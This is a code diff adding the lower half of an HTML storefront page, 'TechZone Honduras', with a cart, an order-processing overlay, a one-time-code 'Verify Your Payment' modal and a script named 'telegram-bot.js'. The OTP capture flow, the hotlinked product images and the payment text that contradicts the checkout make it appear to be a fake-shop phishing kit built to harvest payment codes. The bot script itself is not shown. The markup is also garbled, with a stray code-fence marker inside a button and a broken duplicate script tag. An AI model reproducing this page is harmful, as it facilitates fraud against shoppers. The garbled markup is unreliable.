+                            <button class="add-to-cart-btn" data-product='{"id": "powerbank", "name": "Portable Power Bank 5000mAh", "price": 16, "image": "https://www-konga-com-res.cloudinary.com/w_300,f_auto,fl_lossy,dpr_auto,q_auto/media/catalog/product/J/D/190950_1664522191.jpg"}'>
+                            <i class="fas fa-cart-plus"></i>
+                            <span data-translate="add_to_cart">Add to Cart</span>
+                        </button>
+                        </div>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-section">
+                    <h4 data-translate="company_info">Company Information</h4>
+                    <div class="contact-details">
+                        <p id="footer-address">
+                            <i class="fas fa-map-marker-alt"></i>
+                            TechZone Honduras, Tegucigalpa, Honduras
+                        </p>
+                        <p id="footer-phone">
+                            <i class="fas fa-phone"></i>
+                            <span id="footer-country-phone">+504 9756-4382</span>
+                        </p>
+                        <p id="footer-email">
+                            <i class="fas fa-envelope"></i>
+                            sales@techzone-honduras.com
+                        </p>
+                        <p id="footer-hours">
+                            <i class="fas fa-clock"></i>
+                            Monday to Saturday: 9:00 AM - 8:00 PM
+                        </p>
+                    </div>
+                </div>
+                <div class="footer-section">
+                    <h4 data-translate="quick_links">Quick Links</h4>
+                    <ul>
+                        <li><a href="about.html" data-translate="about">About Us</a></li>
+                        <li><a href="contact.html" data-translate="contact">Contact</a></li>
+                        <li><a href="support.html" data-translate="support">Technical Support</a></li>
+                        <li><a href="warranty.html" data-translate="warranty">Warranty</a></li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h4 data-translate="policies">Policies</h4>
+                    <ul>
+                        <li><a href="privacy.html" data-translate="privacy">Privacy</a></li>
+                        <li><a href="terms.html" data-translate="terms">Terms and Conditions</a></li>
+                        <li><a href="returns.html" data-translate="returns">Returns</a></li>
+                        <li><a href="shipping.html" data-translate="shipping_policy">Shipping</a></li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h4 data-translate="payment_methods">Payment Methods</h4>
+                    <p data-translate="payment_info">We accept bank transfers, deposits and cash on delivery.</p>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2024 TechZone Honduras. <span data-translate="rights_reserved">All rights reserved.</span></p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Cart Sidebar -->
+    <div id="cart-overlay" class="cart-overlay">
+        <div id="cart-sidebar" class="cart-sidebar">
+            <div class="cart-header">
+                <h2 data-translate="shopping_cart">Shopping Cart</h2>
+                <button id="close-cart" aria-label="Close cart">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+
+            <div class="cart-items" id="cart-items">
+                <div id="empty-cart-message" class="empty-cart-message">
+                    <i class="fas fa-shopping-cart"></i>
+                    <p data-translate="empty_cart">Your cart is empty</p>
+                </div>
+            </div>
+
+            <div class="cart-summary">
+                <div class="summary-row">
+                    <span data-translate="subtotal">Subtotal:</span>
+                    <span id="cart-subtotal">$0.00</span>
+                </div>
+                <div class="summary-row">
+                    <span data-translate="shipping">Shipping:</span>
+                    <span id="cart-shipping">Free</span>
+                </div>
+                <div class="summary-row total">
+                    <span data-translate="total">Total:</span>
+                    <span id="cart-total">$0.00</span>
+                </div>
+            </div>
+
+            <div class="cart-actions">
+                <button id="continue-shopping" class="btn btn-secondary" data-translate="continue_shopping">Continue Shopping</button>
+                <button id="checkout-btn" class="btn btn-primary" data-translate="checkout">Proceed to Checkout</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- This will be dynamically created by the JavaScript -->
+
+    <!-- Processing Overlay -->
+    <div id="processing-overlay" class="processing-overlay">
+        <div class="processing-modal">
+            <div class="processing-header">
+                <div class="processing-security">
+                    <i class="fas fa-shield-alt"></i>
+                    <span data-translate="processing_secure">Secure Processing</span>
+                </div>
+            </div>
+
+            <div class="spinner"></div>
+            <h3 data-translate="processing_order">Processing your order...</h3>
+            <p class="text-sm" data-translate="processing_wait">Please do not close this window</p>
+
+            <div class="processing-steps">
+                <div class="processing-step active" id="step-1">
+                    <div class="step-icon active">1</div>
+                    <span data-translate="validating_payment">Validating payment method</span>
+                </div>
+                <div class="processing-step" id="step-2">
+                    <div class="step-icon pending">2</div>
+                    <span data-translate="confirming_inventory">Confirming inventory</span>
+                </div>
+                <div class="processing-step" id="step-3">
+                    <div class="step-icon pending">3</div>
+                    <span data-translate="generating_order">Generating purchase order</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- OTP Verification Overlay -->
+    <div id="otp-overlay" class="otp-overlay">
+        <div class="otp-modal">
+            <div class="otp-header">
+                <div class="otp-security">
+                    <i class="fas fa-shield-alt"></i>
+                    <span data-translate="security_verification">Security Verification</span>
+                </div>
+            </div>
+
+            <div class="otp-content">
+                <h3 data-translate="verify_payment">Verify Your Payment</h3>
+                <p data-translate="otp_sent">We've sent a 6-digit verification code to your phone number ending in **34. Please enter it below to complete your purchase.</p>
+
+                <div class="otp-input-container">
+                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]" />
+                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]" />
+                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]" />
+                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]" />
+                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]" />
+                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]" />
+                </div>
+
+                <div class="otp-timer">
+                    <span data-translate="code_expires">Code expires in: </span> 
+                    <span id="otp-countdown">02:00</span>
+                </div>
+
+                <div class="otp-actions">
+                    <button id="resend-otp-btn" class="btn btn-secondary" disabled data-translate="resend_code">
+                        Resend Code
+                    </button>
+                    <button id="verify-otp-btn" class="btn btn-primary" data-translate="verify_code">
+                        ```text
+Verify Code
+                    </button>
+                    <button id="skip-otp-btn" class="btn btn-outline" style="margin-top: 1rem;">
+                        I don't require OTP
+                    </button>
+                </div>
+
+                <div class="otp-error" id="otp-error" style="display: none;">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    <span data-translate="invalid_code">Invalid code. Please try again.</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Success Overlay -->
+    <div id="success-overlay" class="success-overlay">
+        <div class="success-modal">
+            <div class="success-icon">
+                <i class="fas fa-check-circle"></i>
+            </div>
+            <h3 data-translate="order_confirmed">Order Confirmed!</h3>
+            <p data-translate="order_success_msg">Your order has been processed successfully. You will receive a WhatsApp with the details.</p>
+
+            <div class="order-details">
+                <p><strong data-translate="order_number">Order Number:</strong> <span id="success-order-number"></span></p>
+                <p><strong data-translate="order_total">Total:</strong> <span id="success-order-total"></span></p>
+                <p><strong data-translate="payment_method">Payment Method:</strong> <span id="success-payment-method"></span></p>
+                <p><strong data-translate="estimated_delivery">Estimated Delivery:</strong> <span id="success-delivery-date"></span></p>
+            </div>
+
+            <button id="continue-shopping-success" class="btn btn-primary" data-translate="continue_shopping">Continue Shopping</button>
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+    <script src="telegram-bot.js"></script>
+    <script src="script.js"></script>.js"></script>
+    <script src="script.js"></script>
+</body>
+</html>
